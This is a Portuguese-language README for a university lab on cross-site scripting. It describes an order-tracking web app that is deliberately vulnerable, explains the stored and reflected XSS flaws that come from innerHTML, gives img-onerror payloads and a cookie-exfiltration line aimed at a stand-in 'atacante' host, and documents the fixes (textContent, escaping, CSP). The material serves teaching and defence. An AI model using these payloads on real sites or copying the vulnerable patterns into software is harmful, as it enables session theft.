# OficinaTech — Laboratório de XSS (Sprint 2)

Sistema simples de acompanhamento de **Ordens de Serviço (OS)** de manutenção de
eletrônicos, feito em **HTML + CSS + JS puro**, para o artefato de XSS da
disciplina Segurança em Aplicações (IFB — 2026/1).

Cada OS tem: **cliente, equipamento, data, defeito e descrição**. No topo há um
campo de pesquisa; as ordens aparecem em *cards* no centro, cada um com um botão
**Detalhes**.

O projeto tem duas versões:

| Pasta | O que é |
|-------|---------|
| `codigo-vulneravel/` | Aplicação **intencionalmente vulnerável** (Reflected + Stored XSS) |
| `codigo-corrigido/`  | Mesma aplicação, **corrigida** (textContent, escape, CSP, paginação) |

As duas rodam **sob o mesmo domínio** (mesma origem), como pede o enunciado.

---

## Como rodar

As duas versões precisam ser servidas pela **mesma origem**. Suba um servidor
estático na **raiz do projeto** (não dentro de uma das pastas):

```bash
cd os-xss-lab
python3 -m http.server 8000
```

Depois acesse:

- Vulnerável: <http://localhost:8000/codigo-vulneravel/>
- Segura:     <http://localhost:8000/codigo-corrigido/>

Como as duas vêm de `http://localhost:8000`, compartilham a mesma origem — é
isso que torna honesta a comparação (cookies, `localStorage` etc. pertencem ao
mesmo domínio). Abrir o arquivo com `file://` **não** serve: a CSP e o conceito
de origem não funcionam igual.

> As ordens ficam no `localStorage`. As duas versões usam chaves diferentes
> (`os_vuln` e `os_seguro`), então os dados são **desacoplados**: um payload
> gravado no modo vulnerável não "vaza" para o modo seguro.

---

## Parte 1 — Por que a versão vulnerável é vulnerável

Toda XSS tem a mesma raiz: **dado controlado pelo usuário é colocado na página
como se fosse código**, em vez de como texto. Nesta app isso acontece porque
usamos `innerHTML` com valores crus. O ponto-chave:

> `innerHTML` manda o navegador **interpretar** a string como HTML. Se dentro
> dela houver `<script>` ou um atributo como `onerror=...`, o navegador cria
> aqueles elementos e **executa** o JavaScript. `textContent`, ao contrário,
> trata tudo como texto literal.

### Ponto 1 — Stored XSS (campos da OS)

Em `codigo-vulneravel/app.js`, a função `renderizarCards()` monta o card assim:

```js
card.innerHTML = `
  <h3>${os.cliente}</h3>
  <span class="linha">⚠️ ${os.defeito}</span>
  ...
`;
```

O valor de `os.defeito` vem do formulário e é gravado no `localStorage` **sem
sanitizar**. Quando qualquer pessoa abre a página (ou os **Detalhes**), o campo
é reinjetado via `innerHTML` e executa. É *stored* porque o payload fica
**persistido** e dispara para todo mundo que visualizar aquela OS — sem precisar
de link nenhum.

### Ponto 2 — Reflected XSS (busca)

A busca escreve o termo na query string (`?busca=...`) e, ao carregar a
página, o termo da URL é refletido de volta via `innerHTML`:

```js
const termoURL = new URLSearchParams(location.search).get('busca');
document.getElementById('resultado-busca').innerHTML =
  'Exibindo resultados para: <strong>' + termoURL + '</strong>';
```

O payload não é salvo; ele "vive" no link. Isso é o que caracteriza o
**reflected**: a vítima que apenas **abre um link** `?busca=<payload>`
já executa o script, sem nada ficar persistido no servidor.

---

## Parte 2 — Como explorar

**Stored XSS** — registre uma OS e, no campo **Defeito** ou **Descrição**, use:

```html
<img src=x onerror="alert('XSS armazenado')">
```

Clique em **Registrar OS**. O card chama `alert` assim que renderiza; no modal
de **Detalhes**, dispara de novo. Como a OS fica salva, basta recarregar a
página (F5) que o `alert` volta — provando a persistência.

> Por que `<img onerror>` e não `<script>`? Tags `<script>` inseridas via
> `innerHTML` **não** são executadas pelo navegador por padrão; já um `<img>`
> com `src` inválido dispara o handler `onerror`. É o payload clássico para
> sinks de `innerHTML`.

**Reflected XSS** — no campo de busca do topo, digite e pesquise:

```html
<img src=x onerror="alert(document.cookie)">
```

Ao pesquisar, a página recarrega com `?busca=<payload>` na URL e o `alert`
dispara exibindo o cookie **de sessão** (`sessao=abc123-token-fake`), criado
pela própria app para a demonstração. Como o payload fica **no link**, basta
copiar a URL da barra de endereços e abri-la em outra aba para o ataque
disparar de novo — é assim que uma vítima seria atingida ao clicar num link
malicioso. Trocar `alert` por envio a um servidor
(`new Image().src='http://atacante/c?'+document.cookie`) é o que, num cenário
real, caracterizaria **roubo de sessão**.

### Análise STRIDE

| Categoria | Aplica? | Por quê |
|-----------|:------:|---------|
| **S** — Spoofing | ✅ | Com `document.cookie` o atacante rouba a sessão e se passa pela vítima |
| **T** — Tampering | ✅ | O script altera o conteúdo/DOM visto pelo usuário |
| **I** — Information Disclosure | ✅ | Vaza cookies, `localStorage`, dados da tela |
| **R** — Repudiation | ⚠️ | Pode executar ações em nome do usuário sem ele saber |
| **D** / **E** | ➖ | Não são o foco desta app (sem área de admin nem DoS) |

Os principais para documentar aqui são **T + I + S**.

---

## Parte 3 — Como corrigir (o que muda na versão segura)

A versão `codigo-corrigido/` mantém **as mesmas funcionalidades** e aplica
**defesas diferentes em cada ponto** (atende ao critério "método diferente"):

1. **Cards e busca → `textContent` / `createElement`.**
   Em vez de concatenar HTML, criamos cada nó e preenchemos com `textContent`.
   O navegador trata o payload como texto: `<img src=x onerror=...>` aparece
   **escrito na tela**, não executa. Esta é a correção *preferida* para DOM XSS.

2. **Modal → *output encoding* com `escaparHTML()`.**
   Onde ainda é conveniente montar markup, passamos todo valor do usuário por
   `escaparHTML()`, que converte `< > & " '` em entidades — o equivalente ao
   `htmlspecialchars()` do PHP. Mostra uma técnica de defesa diferente do item 1.

3. **CSP (camada extra).**
   O `index.html` seguro declara:
   ```html
   <meta http-equiv="Content-Security-Policy"
         content="default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'">
   ```
   Mesmo que algum payload escapasse, `script-src 'self'` bloquearia scripts
   inline e de origens externas — defesa em profundidade.

4. **Controle próprio desacoplado + paginação.**
   O módulo seguro tem estado próprio (`paginaAtual`, `termoAtivo`), storage
   próprio (`os_seguro`) e **paginação** (`POR_PAGINA = 4`), independente da
   versão vulnerável.

### Verificação da correção

Repita os **mesmos payloads** da Parte 2 na versão segura:

- No card/busca: o texto `<img src=x onerror=...>` aparece **literal**, sem
  `alert`.
- No modal: idem, graças ao escape.
- No console (F12), a CSP registra o bloqueio de qualquer script inline.

Se o navegador **mostra o script como texto em vez de executá-lo**, a correção
está funcionando — exatamente o critério do guia.

